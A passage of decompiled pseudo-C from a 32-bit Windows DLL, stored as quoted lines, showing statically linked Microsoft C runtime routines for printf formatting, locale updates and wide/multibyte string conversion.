    "  int v5; // eax",
    "  int v6; // esi",
    "  unsigned int v7; // ebx",
    "  bool v8; // zf",
    "  int v9; // eax",
    "  int v11; // [esp-8h] [ebp-18h]",
    "  unsigned __int16 *v12; // [esp+8h] [ebp-8h]",
    "",
    "  v2 = (unsigned __int16 **)this[4];",
    "  this[4] = (int)(v2 + 1);",
    "  v3 = *v2;",
    "  v12 = *v2;",
    "  if ( !*v2 || !*((_DWORD *)v3 + 1) )",
    "  {",
    "    v9 = 6;",
    "    this[12] = (int)\"(null)\";",
    "    goto LABEL_6;",
    "  }",
    "  v4 = *((_WORD *)this + 23);",
    "  v5 = this[1];",
    "  v6 = *this;",
    "  v11 = this[10];",
    "  this[12] = *((_DWORD *)v3 + 1);",
    "  v7 = *v12;",
    "  v8 = __crt_stdio_output::is_wide_character_specifier<wchar_t>(v6, v5, v4, v11) == 0;",
    "  v9 = v7;",
    "  if ( v8 )",
    "  {",
    "LABEL_6:",
    "    *((_BYTE *)this + 56) = 0;",
    "    goto LABEL_7;",
    "  }",
    "  *((_BYTE *)this + 56) = 1;",
    "  v9 = v7 >> 1;",
    "LABEL_7:",
    "  this[13] = v9;",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C2B3(int this)",
    "{",
    "  int v2; // eax",
    "  char v3; // al",
    "  char v4; // cl",
    "  _DWORD *v5; // esi",
    "  size_t v6; // eax",
    "  int v7; // eax",
    "  int *v8; // ecx",
    "  int v9; // eax",
    "  int v10; // ecx",
    "  char *v11; // eax",
    "  int v12; // ebx",
    "  int v13; // edi",
    "  char *v14; // esi",
    "  rsize_t v15; // ecx",
    "  char *v16; // eax",
    "  int v17; // ebx",
    "  char *v18; // esi",
    "  _DWORD *v19; // ecx",
    "  int v20; // edi",
    "  char v21; // al",
    "  _DWORD *v22; // esi",
    "  int v23; // edi",
    "  const char *v24; // edx",
    "  char v25; // al",
    "  char result; // al",
    "  int v27; // [esp-4h] [ebp-28h]",
    "  int v28; // [esp-4h] [ebp-28h]",
    "  int v29; // [esp+8h] [ebp-1Ch] BYREF",
    "  int v30; // [esp+Ch] [ebp-18h]",
    "  _DWORD *v31; // [esp+10h] [ebp-14h]",
    "  char *v32; // [esp+14h] [ebp-10h]",
    "  int v33; // [esp+18h] [ebp-Ch]",
    "  size_t Size; // [esp+1Ch] [ebp-8h]",
    "  char *Str; // [esp+20h] [ebp-4h]",
    "",
    "  v33 = this;",
    "  *(_DWORD *)(this + 28) |= 0x10u;",
    "  v2 = *(_DWORD *)(this + 36);",
    "  if ( v2 >= 0 )",
    "  {",
    "    if ( !v2 )",
    "    {",
    "      v4 = *(_BYTE *)(this + 45);",
    "      if ( v4 == 103 || v4 == 71 )",
    "      {",
    "        *(_DWORD *)(this + 36) = 1;",
    "        v2 = 1;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v3 = *(_BYTE *)(this + 45);",
    "    if ( v3 == 97 || v3 == 65 )",
    "      v27 = 13;",
    "    else",
    "      v27 = 6;",
    "    v2 = v27;",
    "    *(_DWORD *)(this + 36) = v27;",
    "  }",
    "  v28 = *(_DWORD *)(this + 8);",
    "  v5 = (_DWORD *)(this + 60);",
    "  Str = (char *)(this + 60);",
    "  if ( sub_1001937A((_DWORD *)(this + 60), v2 + 349, v28) )",
    "  {",
    "    v6 = *(_DWORD *)(this + 36);",
    "  }",
    "  else",
    "  {",
    "    v6 = __crt_stdio_output::formatting_buffer::count<char>((_DWORD *)(this + 60)) - 349;",
    "    *(_DWORD *)(this + 36) = v6;",
    "  }",
    "  Size = v6;",
    "  v7 = *(_DWORD *)(this + 1088);",
    "  v31 = (_DWORD *)(this + 48);",
    "  if ( !v7 )",
    "    v7 = this + 60;",
    "  v29 = 0;",
    "  v30 = 0;",
    "  *(_DWORD *)(this + 48) = v7;",
    "  v8 = *(int **)(this + 16);",
    "  *(_DWORD *)(this + 16) = v8 + 2;",
    "  v9 = *v8;",
    "  v10 = v8[1];",
    "  v29 = v9;",
    "  v11 = (char *)(this + 45);",
    "  v12 = *(char *)(this + 45);",
    "  v30 = v10;",
    "  v32 = v11;",
    "  v13 = __crt_stdio_output::formatting_buffer::count<char>(v5);",
    "  v14 = __crt_stdio_output::formatting_buffer::scratch_data<char>(v5);",
    "  v15 = __crt_stdio_output::formatting_buffer::count<char>(Str);",
    "  v16 = (char *)*((_DWORD *)Str + 257);",
    "  if ( !v16 )",
    "    v16 = Str;",
    "  __acrt_fp_format(",
    "    (int)&v29,",
    "    v16,",
    "    v15,",
    "    (int)v14,",
    "    v13,",
    "    v12,",
    "    Size,",
    "    *(_DWORD *)v33,",
    "    *(_DWORD *)(v33 + 4),",
    "    1,",
    "    *(__crt_cached_ptd_host **)(v33 + 8));",
    "  v17 = v33;",
    "  v18 = v32;",
    "  v19 = v31;",
    "  if ( (*(_DWORD *)(v33 + 28) & 0x20) != 0 && !*(_DWORD *)(v33 + 36) )",
    "  {",
    "    v20 = *(_DWORD *)(v33 + 8);",
    "    if ( !*(_BYTE *)(v20 + 20) )",
    "    {",
    "      __crt_cached_ptd_host::update_locale_slow(*(__crt_cached_ptd_host **)(v33 + 8));",
    "      v18 = (char *)(v17 + 45);",
    "    }",
    "    sub_1001AEDC(*(unsigned __int8 **)(v17 + 48), (int *)(v20 + 12));",
    "    v19 = (_DWORD *)(v17 + 48);",
    "  }",
    "  v21 = *v18;",
    "  if ( *v18 == 103 || (v22 = v19, v21 == 71) )",
    "  {",
    "    v22 = v19;",
    "    if ( (*(_DWORD *)(v17 + 28) & 0x20) == 0 )",
    "    {",
    "      v23 = *(_DWORD *)(v17 + 8);",
    "      if ( !*(_BYTE *)(v23 + 20) )",
    "      {",
    "        __crt_cached_ptd_host::update_locale_slow(*(__crt_cached_ptd_host **)(v17 + 8));",
    "        v22 = (_DWORD *)(v17 + 48);",
    "      }",
    "      sub_1001ADFD(*(char **)(v17 + 48), v23 + 12);",
    "    }",
    "  }",
    "  v24 = *(const char **)(v17 + 48);",
    "  v25 = *v24;",
    "  if ( *v24 == 45 )",
    "  {",
    "    *(_DWORD *)(v17 + 28) |= 0x40u;",
    "    *v22 = ++v24;",
    "    v25 = *v24;",
    "  }",
    "  if ( v25 == 105 || v25 == 73 || v25 == 110 || v25 == 78 )",
    "  {",
    "    *(_DWORD *)(v17 + 28) &= ~8u;",
    "    *(_BYTE *)(v17 + 45) = 115;",
    "  }",
    "  result = 1;",
    "  *(_DWORD *)(v17 + 52) = strlen(v24);",
    "  return result;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C46A(int this)",
    "{",
    "  int v2; // eax",
    "  int v3; // eax",
    "  __int16 v4; // cx",
    "  _DWORD *v5; // esi",
    "  size_t v6; // eax",
    "  int v7; // eax",
    "  int *v8; // ecx",
    "  int v9; // eax",
    "  int v10; // ecx",
    "  __int16 *v11; // eax",
    "  int v12; // ebx",
    "  int v13; // edi",
    "  char *v14; // esi",
    "  rsize_t v15; // ecx",
    "  char *v16; // eax",
    "  int v17; // ebx",
    "  __int16 *v18; // esi",
    "  _DWORD *v19; // ecx",
    "  int v20; // edi",
    "  __int16 v21; // ax",
    "  _DWORD *v22; // esi",
    "  int v23; // edi",
    "  const char *v24; // edx",
    "  char v25; // al",
    "  char result; // al",
    "  int v27; // [esp-4h] [ebp-2Ch]",
    "  int v28; // [esp-4h] [ebp-2Ch]",
    "  int v29; // [esp+Ch] [ebp-1Ch] BYREF",
    "  int v30; // [esp+10h] [ebp-18h]",
    "  _DWORD *v31; // [esp+14h] [ebp-14h]",
    "  __int16 *v32; // [esp+18h] [ebp-10h]",
    "  int v33; // [esp+1Ch] [ebp-Ch]",
    "  size_t Size; // [esp+20h] [ebp-8h]",
    "  char *Str; // [esp+24h] [ebp-4h]",
    "",
    "  *(_DWORD *)(this + 28) |= 0x10u;",
    "  v2 = *(_DWORD *)(this + 36);",
    "  v33 = this;",
    "  if ( v2 >= 0 )",
    "  {",
    "    if ( !v2 )",
    "    {",
    "      v4 = *(_WORD *)(this + 46);",
    "      if ( v4 == 103 || v4 == 71 )",
    "      {",
    "        *(_DWORD *)(this + 36) = 1;",
    "        v2 = 1;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v3 = *(unsigned __int16 *)(this + 46);",
    "    if ( v3 == 97 || v3 == 65 )",
    "      v27 = 13;",
    "    else",
    "      v27 = 6;",
    "    v2 = v27;",
    "    *(_DWORD *)(this + 36) = v27;",
    "  }",
    "  v28 = *(_DWORD *)(this + 8);",
    "  v5 = (_DWORD *)(this + 60);",
    "  Str = (char *)(this + 60);",
    "  if ( sub_1001937A((_DWORD *)(this + 60), v2 + 349, v28) )",
    "  {",
    "    v6 = *(_DWORD *)(this + 36);",
    "  }",
    "  else",
    "  {",
    "    v6 = __crt_stdio_output::formatting_buffer::count<char>((_DWORD *)(this + 60)) - 349;",
    "    *(_DWORD *)(this + 36) = v6;",
    "  }",
    "  Size = v6;",
    "  v7 = *(_DWORD *)(this + 1088);",
    "  v31 = (_DWORD *)(this + 48);",
    "  if ( !v7 )",
    "    v7 = this + 60;",
    "  v29 = 0;",
    "  v30 = 0;",
    "  *(_DWORD *)(this + 48) = v7;",
    "  v8 = *(int **)(this + 16);",
    "  *(_DWORD *)(this + 16) = v8 + 2;",
    "  v9 = *v8;",
    "  v10 = v8[1];",
    "  v29 = v9;",
    "  v11 = (__int16 *)(this + 46);",
    "  v12 = *(char *)(this + 46);",
    "  v30 = v10;",
    "  v32 = v11;",
    "  v13 = __crt_stdio_output::formatting_buffer::count<char>(v5);",
    "  v14 = __crt_stdio_output::formatting_buffer::scratch_data<char>(v5);",
    "  v15 = __crt_stdio_output::formatting_buffer::count<char>(Str);",
    "  v16 = (char *)*((_DWORD *)Str + 257);",
    "  if ( !v16 )",
    "    v16 = Str;",
    "  __acrt_fp_format(",
    "    (int)&v29,",
    "    v16,",
    "    v15,",
    "    (int)v14,",
    "    v13,",
    "    v12,",
    "    Size,",
    "    *(_DWORD *)v33,",
    "    *(_DWORD *)(v33 + 4),",
    "    1,",
    "    *(__crt_cached_ptd_host **)(v33 + 8));",
    "  v17 = v33;",
    "  v18 = v32;",
    "  v19 = v31;",
    "  if ( (*(_DWORD *)(v33 + 28) & 0x20) != 0 && !*(_DWORD *)(v33 + 36) )",
    "  {",
    "    v20 = *(_DWORD *)(v33 + 8);",
    "    if ( !*(_BYTE *)(v20 + 20) )",
    "    {",
    "      __crt_cached_ptd_host::update_locale_slow(*(__crt_cached_ptd_host **)(v33 + 8));",
    "      v18 = (__int16 *)(v17 + 46);",
    "    }",
    "    sub_1001AEDC(*(unsigned __int8 **)(v17 + 48), (int *)(v20 + 12));",
    "    v19 = (_DWORD *)(v17 + 48);",
    "  }",
    "  v21 = *v18;",
    "  if ( *v18 == 103 || (v22 = v19, v21 == 71) )",
    "  {",
    "    v22 = v19;",
    "    if ( (*(_DWORD *)(v17 + 28) & 0x20) == 0 )",
    "    {",
    "      v23 = *(_DWORD *)(v17 + 8);",
    "      if ( !*(_BYTE *)(v23 + 20) )",
    "      {",
    "        __crt_cached_ptd_host::update_locale_slow(*(__crt_cached_ptd_host **)(v17 + 8));",
    "        v22 = (_DWORD *)(v17 + 48);",
    "      }",
    "      sub_1001ADFD(*(char **)(v17 + 48), v23 + 12);",
    "    }",
    "  }",
    "  v24 = *(const char **)(v17 + 48);",
    "  v25 = *v24;",
    "  if ( *v24 == 45 )",
    "  {",
    "    *(_DWORD *)(v17 + 28) |= 0x40u;",
    "    *v22 = ++v24;",
    "    v25 = *v24;",
    "  }",
    "  if ( v25 == 105 || v25 == 73 || v25 == 110 || v25 == 78 )",
    "  {",
    "    *(_DWORD *)(v17 + 28) &= ~8u;",
    "    *(_WORD *)(v17 + 46) = 115;",
    "  }",
    "  result = 1;",
    "  *(_DWORD *)(v17 + 52) = strlen(v24);",
    "  return result;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C637(int this, int a2)",
    "{",
    "  _DWORD *v3; // ebx",
    "  bool is_wide_character; // al",
    "  _BYTE *v5; // ecx",
    "  bool v6; // zf",
    "  _BYTE *v7; // eax",
    "  WCHAR v8; // si",
    "  size_t v9; // eax",
    "  CHAR *v10; // ecx",
    "  _BYTE *v11; // edx",
    "  _DWORD *v12; // ecx",
    "  char result; // al",
    "",
    "  v3 = (_DWORD *)(this + 60);",
    "  is_wide_character = __crt_stdio_output::is_wide_character_specifier<char>(",
    "                        *(_DWORD *)this,",
    "                        *(_DWORD *)(this + 4),",
    "                        *(_BYTE *)(this + 45),",
    "                        *(_DWORD *)(this + 40));",
    "  v5 = *(_BYTE **)(this + 16);",
    "  v6 = !is_wide_character;",
    "  v7 = v5 + 4;",
    "  if ( v6 )",
    "  {",
    "    v11 = (_BYTE *)v3[257];",
    "    *(_DWORD *)(this + 16) = v7;",
    "    if ( !v11 )",
    "      v11 = v3;",
    "    *v11 = *v5;",
    "    *(_DWORD *)(this + 52) = 1;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 16) = v7;",
    "    v8 = *(_WORD *)v5;",
    "    v9 = __crt_stdio_output::formatting_buffer::count<char>(v3);",
    "    v10 = (CHAR *)v3[257];",
    "    if ( !v10 )",
    "      v10 = (CHAR *)v3;",
    "    if ( sub_1002113B(this + 52, v10, v9, v8, *(__crt_cached_ptd_host **)(this + 8)) )",
    "      *(_BYTE *)(this + 44) = 1;",
    "  }",
    "  v12 = (_DWORD *)v3[257];",
    "  result = 1;",
    "  if ( !v12 )",
    "    v12 = v3;",
    "  *(_DWORD *)(this + 48) = v12;",
    "  return result;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_16(char *this, int a2)",
    "{",
    "}char __thiscall sub_1001C768(int this)",
    "{",
    "  _QWORD **v2; // edx",
    "  _QWORD *v3; // edi",
    "  int v4; // eax",
    "  int v6; // eax",
    "  int v7; // eax",
    "  int v8; // eax",
    "",
    "  v2 = *(_QWORD ***)(this + 16);",
    "  *(_DWORD *)(this + 16) = v2 + 1;",
    "  v3 = *v2;",
    "  if ( !_get_printf_count_output() )",
    "    goto LABEL_2;",
    "  v6 = sub_1001C178(*(_DWORD *)(this + 40)) - 1;",
    "  if ( v6 )",
    "  {",
    "    v7 = v6 - 1;",
    "    if ( v7 )",
    "    {",
    "      v8 = v7 - 2;",
    "      if ( v8 )",
    "      {",
    "        if ( v8 != 4 )",
    "        {",
    "LABEL_2:",
    "          v4 = *(_DWORD *)(this + 8);",
    "          *(_BYTE *)(v4 + 28) = 1;",
    "          *(_DWORD *)(v4 + 24) = 22;",
    "          _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "          return 0;",
    "        }",
    "        *v3 = *(int *)(this + 20);",
    "      }",
    "      else",
    "      {",
    "        *(_DWORD *)v3 = *(_DWORD *)(this + 20);",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *(_WORD *)v3 = *(_WORD *)(this + 20);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)v3 = *(_BYTE *)(this + 20);",
    "  }",
    "  *(_BYTE *)(this + 44) = 1;",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C7ED(_DWORD *this)",
    "{",
    "  if ( (this[7] & 0x20) != 0 )",
    "    this[7] |= 0x80u;",
    "  return sub_10019D5E((int)this, 0);",
    "}",
    "",
    "",
    "char __thiscall sub_1001C80A(_DWORD *this)",
    "{",
    "  if ( (this[7] & 0x20) != 0 )",
    "    this[7] |= 0x80u;",
    "  return sub_10019EEB((int)this, 0);",
    "}",
    "",
    "",
    "char __thiscall sub_1001C827(_DWORD *this)",
    "{",
    "  this[9] = 8;",
    "  this[10] = 10;",
    "  return sub_1001A39C((int)this, 1);",
    "}",
    "",
    "",
    "char __thiscall sub_1001C83D(_DWORD *this)",
    "{",
    "  this[9] = 8;",
    "  this[10] = 10;",
    "  return sub_1001A529((int)this, 1);",
    "}",
    "",
    "",
    "char __thiscall sub_1001C853(int this)",
    "{",
    "  const char **v2; // edx",
    "  int v3; // ebx",
    "  const char *v4; // esi",
    "  int v5; // eax",
    "  int v7; // [esp-Ch] [ebp-18h]",
    "  char v8; // [esp-8h] [ebp-14h]",
    "  int v9; // [esp-4h] [ebp-10h]",
    "",
    "  v2 = *(const char ***)(this + 16);",
    "  *(_DWORD *)(this + 16) = v2 + 1;",
    "  v3 = *(_DWORD *)(this + 36);",
    "  v9 = *(_DWORD *)(this + 40);",
    "  v4 = *v2;",
    "  if ( v3 == -1 )",
    "    v3 = 0x7FFFFFFF;",
    "  v8 = *(_BYTE *)(this + 45);",
    "  v7 = *(_DWORD *)(this + 4);",
    "  *(_DWORD *)(this + 48) = v4;",
    "  if ( __crt_stdio_output::is_wide_character_specifier<char>(*(_DWORD *)this, v7, v8, v9) )",
    "  {",
    "    if ( !v4 )",
    "    {",
    "      v4 = (const char *)L\"(null)\";",
    "      *(_DWORD *)(this + 48) = L\"(null)\";",
    "    }",
    "    *(_BYTE *)(this + 56) = 1;",
    "    v5 = sub_10020456(v4, v3);",
    "  }",
    "  else",
    "  {",
    "    if ( !v4 )",
    "    {",
    "      v4 = \"(null)\";",
    "      *(_DWORD *)(this + 48) = \"(null)\";",
    "    }",
    "    v5 = sub_10020321(v4, v3);",
    "  }",
    "  *(_DWORD *)(this + 52) = v5;",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C8C6(void *this)",
    "{",
    "  const wchar_t **v2; // edx",
    "  int v3; // ebx",
    "  const wchar_t *v4; // edi",
    "  int v5; // eax",
    "  int v7; // [esp-Ch] [ebp-18h]",
    "  __int16 v8; // [esp-8h] [ebp-14h]",
    "  int v9; // [esp-4h] [ebp-10h]",
    "",
    "  v2 = (const wchar_t **)*((_DWORD *)this + 4);",
    "  *((_DWORD *)this + 4) = v2 + 1;",
    "  v3 = *((_DWORD *)this + 9);",
    "  v9 = *((_DWORD *)this + 10);",
    "  v4 = *v2;",
    "  if ( v3 == -1 )",
    "    v3 = 0x7FFFFFFF;",
    "  v8 = *((_WORD *)this + 23);",
    "  v7 = *((_DWORD *)this + 1);",
    "  *((_DWORD *)this + 12) = v4;",
    "  if ( __crt_stdio_output::is_wide_character_specifier<wchar_t>(*(_DWORD *)this, v7, v8, v9) )",
    "  {",
    "    if ( !v4 )",
    "    {",
    "      v4 = L\"(null)\";",
    "      *((_DWORD *)this + 12) = L\"(null)\";",
    "    }",
    "    *((_BYTE *)this + 56) = 1;",
    "    v5 = sub_10020456(v4, v3);",
    "  }",
    "  else",
    "  {",
    "    if ( !v4 )",
    "      *((_DWORD *)this + 12) = \"(null)\";",
    "    v5 = sub_1001C93B(v3, 0);",
    "  }",
    "  *((_DWORD *)this + 13) = v5;",
    "  return 1;",
    "}",
    "",
    "",
    "int __thiscall sub_1001C93B(int this, int a2, int a3)",
    "{",
    "  int v4; // esi",
    "  int v5; // ebx",
    "  _BYTE *v6; // esi",
    "  int v7; // edi",
    "  int v8; // ecx",
    "  int v9; // edx",
    "  int v10; // eax",
    "  int ctype_array_value; // eax",
    "  _BYTE *v12; // ecx",
    "",
    "  v4 = *(_DWORD *)(this + 8);",
    "  if ( !*(_BYTE *)(v4 + 20) )",
    "    __crt_cached_ptd_host::update_locale_slow(*(__crt_cached_ptd_host **)(this + 8));",
    "  v5 = *(_DWORD *)(v4 + 12);",
    "  v6 = *(_BYTE **)(this + 48);",
    "  v7 = 0;",
    "  if ( *(_DWORD *)(v5 + 8) == 65001 )",
    "  {",
    "    if ( a2 > 0 )",
    "    {",
    "      do",
    "      {",
    "        if ( !*v6 )",
    "          break;",
    "        v8 = sub_100213CF(v6);",
    "        v9 = 1;",
    "        v10 = v7 + 1;",
    "        if ( (unsigned int)(v8 - 1) <= 3 )",
    "          v9 = v8;",
    "        if ( v8 != 4 )",
    "          v10 = v7;",
    "        v6 += v9;",
    "        v7 = v10 + 1;",
    "      }",
    "      while ( v10 + 1 < a2 );",
    "    }",
    "  }",
    "  else if ( a2 > 0 )",
    "  {",
    "    do",
    "    {",
    "      if ( !*v6 )",
    "        break;",
    "      ctype_array_value = __acrt_locale_get_ctype_array_value(",
    "                            *(const unsigned __int16 *const *)v5,",
    "                            (unsigned __int8)*v6,",
    "                            0x8000);",
    "      v12 = v6 + 1;",
    "      if ( !ctype_array_value )",
    "        v12 = v6;",
    "      ++v7;",
    "      v6 = v12 + 1;",
    "    }",
    "    while ( v7 < a2 );",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "void __thiscall __crt_strtox::c_string_character_source<char>::unget(_DWORD *this, char a2)",
    "{",
    "  _BYTE *v2; // eax",
    "",
    "  v2 = (_BYTE *)(*this - 1);",
    "  *this = v2;",
    "  if ( a2 )",
    "  {",
    "    if ( *v2 != a2 )",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      _invalid_parameter_noinfo();",
    "    }",
    "  }",
    "}",
    "",
    "",
    "void __thiscall __crt_strtox::c_string_character_source<wchar_t>::unget(_DWORD *this, __int16 a2)",
    "{",
    "  _WORD *v2; // eax",
    "",
    "  v2 = (_WORD *)(*this - 2);",
    "  *this = v2;",
    "  if ( a2 )",
    "  {",
    "    if ( *v2 != a2 )",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      _invalid_parameter_noinfo();",
    "    }",
    "  }",
    "}",
    "",
    "",
    "void __thiscall __crt_cached_ptd_host::update_locale_slow(__crt_cached_ptd_host *this)",
    "{",
    "  int v2; // eax",
    "  int v3; // eax",
    "  int v4; // [esp-4h] [ebp-14h]",
    "  int v5; // [esp+Ch] [ebp-4h]",
    "",
    "  v2 = unknown_libname_7(this);",
    "  v4 = *((_DWORD *)this + 1);",
    "  v5 = v2;",
    "  *((_DWORD *)this + 3) = *(_DWORD *)(v2 + 76);",
    "  *((_DWORD *)this + 4) = *(_DWORD *)(v2 + 72);",
    "  sub_100201EF(v2, (char *)this + 12, v4);",
    "  sub_1002024D(v5, (char *)this + 16, *((_DWORD *)this + 1));",
    "  v3 = *(_DWORD *)(v5 + 848);",
    "  if ( (v3 & 2) == 0 )",
    "  {",
    "    *(_DWORD *)(v5 + 848) = v3 | 2;",
    "    *((_BYTE *)this + 20) = 2;",
    "  }",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_17(_DWORD *this)",
    "{",
    "}// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_18(_DWORD *this, __crt_cached_ptd_host *a2)",
    "{",
    "}void __thiscall sub_1001CB07(int *this, void *Src, unsigned int a3, _DWORD *a4, int a5)",
    "{",
    "  int v6; // eax",
    "  int v7; // edx",
    "  unsigned int v8; // edx",
    "  size_t v9; // edi",
    "",
    "  if ( a3 )",
    "  {",
    "    v6 = *this;",
    "    v7 = *(_DWORD *)(*this + 4);",
    "    if ( *(_DWORD *)(*this + 8) == v7 )",
    "    {",
    "      if ( *(_BYTE *)(v6 + 12) )",
    "        *a4 += a3;",
    "      else",
    "        *a4 = -1;",
    "    }",
    "    else",
    "    {",
    "      v8 = v7 - *(_DWORD *)(v6 + 8);",
    "      v9 = a3;",
    "      if ( v8 < a3 )",
    "        v9 = v8;",
    "      memmove(*(void **)v6, Src, v9);",
    "      *(_DWORD *)*this += v9;",
    "      *(_DWORD *)(*this + 8) += v9;",
    "      if ( *(_BYTE *)(*this + 12) )",
    "      {",
    "        *a4 += a3;",
    "      }",
    "      else if ( v9 == a3 )",
    "      {",
    "        *a4 += v9;",
    "      }",
    "      else",
    "      {",
    "        *a4 = -1;",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_1001CB76(_DWORD *this, void *Src, unsigned int a3, _DWORD *a4, int a5)",
    "{",
    "  _DWORD *result; // eax",
    "  int v6; // eax",
    "  int v7; // edx",
    "  bool v8; // zf",
    "  unsigned int v9; // edx",
    "  unsigned int v10; // ebx",
    "",
    "  result = this;",
    "  if ( a3 )",
    "  {",
    "    v6 = *this;",
    "    v7 = *(_DWORD *)(*this + 4);",
    "    if ( *(_DWORD *)(*this + 8) == v7 )",
    "    {",
    "      v8 = *(_BYTE *)(v6 + 12) == 0;",
    "      result = a4;",
    "      if ( v8 )",
    "        *a4 = -1;",
    "      else",
    "        *a4 += a3;",
    "    }",
    "    else",
    "    {",
    "      v9 = v7 - *(_DWORD *)(v6 + 8);",
    "      v10 = a3;",
    "      if ( v9 < a3 )",
    "        v10 = v9;",
    "      memmove(*(void **)v6, Src, 2 * v10);",
    "      *(_DWORD *)*this += 2 * v10;",
    "      *(_DWORD *)(*this + 8) += v10;",
    "      result = a4;",
    "      if ( *(_BYTE *)(*this + 12) )",
    "      {",
    "        *a4 += a3;",
    "      }",
    "      else if ( v10 == a3 )",
    "      {",
    "        *a4 += v10;",
    "      }",
    "      else",
    "      {",
    "        *a4 = -1;",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl __stdio_common_vsprintf(",
    "        unsigned __int64 Options,",
    "        char *Buffer,",
    "        size_t BufferCount,",
    "        const char *Format,",
    "        _locale_t Locale,",
    "        va_list ArgList)",
    "{",
    "  int v6; // esi",
    "  _BYTE v8[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v8, Locale);",
    "  v6 = common_vsprintf<__crt_stdio_output::standard_base,char>(",
    "         Options,",
    "         SHIDWORD(Options),",
    "         Buffer,",
    "         BufferCount,",
    "         (int)Format,",
    "         (__crt_cached_ptd_host *)v8,",
    "         (int)ArgList);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v8);",
    "  return v6;",
    "}",
    "",
    "",
    "int __cdecl __stdio_common_vswprintf(",
    "        unsigned __int64 Options,",
    "        wchar_t *Buffer,",
    "        size_t BufferCount,",
    "        const wchar_t *Format,",
    "        _locale_t Locale,",
    "        va_list ArgList)",
    "{",
    "  int v6; // esi",
    "  _BYTE v8[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v8, Locale);",
    "  v6 = common_vsprintf<__crt_stdio_output::standard_base,wchar_t>(",
    "         Options,",
    "         SHIDWORD(Options),",
    "         Buffer,",
    "         BufferCount,",
    "         (int)Format,",
    "         (__crt_cached_ptd_host *)v8,",
    "         (int)ArgList);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v8);",
    "  return v6;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void __cdecl j___free_base(void *Block)",
    "{",
    "}int __cdecl sub_1001CC90(int a1)",
    "{",
    "  return sub_100202D0(a1);",
    "}",
    "",
    "",
    "int __cdecl __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(",
    "        LPCCH lpMultiByteStr,",
    "        int a2,",
    "        int a3,",
    "        UINT CodePage)",
    "{",
    "  int v4; // esi",
    "  int result; // eax",
    "  unsigned int v6; // eax",
    "  DWORD LastError; // eax",
    "  int v8; // eax",
    "",
    "  if ( !lpMultiByteStr )",
    "  {",
    "    v4 = a2;",
    "    unknown_libname_19(a2);",
    "    *(_DWORD *)(a2 + 8) = 0;",
    "    *(_DWORD *)(a2 + 12) = 0;",
    "LABEL_3:",
    "    *(_DWORD *)(v4 + 16) = 0;",
    "    return 0;",
    "  }",
    "  if ( *lpMultiByteStr )",
    "  {",
    "    v6 = __acrt_MultiByteToWideChar(CodePage, 9u, lpMultiByteStr, -1, 0, 0);",
    "    if ( v6 )",
    "    {",
    "      if ( v6 > *(_DWORD *)(a2 + 12) )",
    "      {",
    "        result = sub_1001CE45(v6);",
    "        if ( result )",
    "          return result;",
    "      }",
    "      v8 = __acrt_MultiByteToWideChar(CodePage, 9u, lpMultiByteStr, -1, *(LPWSTR *)(a2 + 8), *(_DWORD *)(a2 + 12));",
    "      if ( v8 )",
    "      {",
    "        *(_DWORD *)(a2 + 16) = v8 - 1;",
    "        return 0;",
    "      }",
    "    }",
    "    LastError = GetLastError();",
    "    __acrt_errno_map_os_error(LastError);",
    "    return *(_DWORD *)sub_1001E025();",
    "  }",
    "  v4 = a2;",
    "  if ( *(_DWORD *)(a2 + 12) || (result = sub_1001CE45(1)) == 0 )",
    "  {",
    "    **(_WORD **)(a2 + 8) = 0;",
    "    goto LABEL_3;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1001CD4D(LPCCH lpMultiByteStr, int a2, UINT CodePage)",
    "{",
    "  int v3; // ecx",
    "  int var1; // [esp+1h] [ebp-1h] BYREF",
    "",
    "  LOBYTE(var1) = HIBYTE(v3);",
    "  return __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(",
    "           lpMultiByteStr,",
    "           a2,",
    "           (int)&var1,",
    "           CodePage);",
    "}",
    "",
    "",
    "_LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this, struct __crt_locale_pointers *const a2)",
    "{",
    "  struct __crt_locale_data **v3; // ebx",
    "  struct __crt_locale_data *locinfo; // eax",
    "  struct __crt_multibyte_data *mbcinfo; // ecx",
    "  int v6; // eax",
    "  int v7; // eax",
    "",
    "  *((_BYTE *)this + 12) = 0;",
    "  v3 = (struct __crt_locale_data **)((char *)this + 4);",
    "  if ( a2 )",
    "  {",
    "    locinfo = a2->locinfo;",
    "    mbcinfo = a2->mbcinfo;",
    "LABEL_5:",
    "    *v3 = locinfo;",
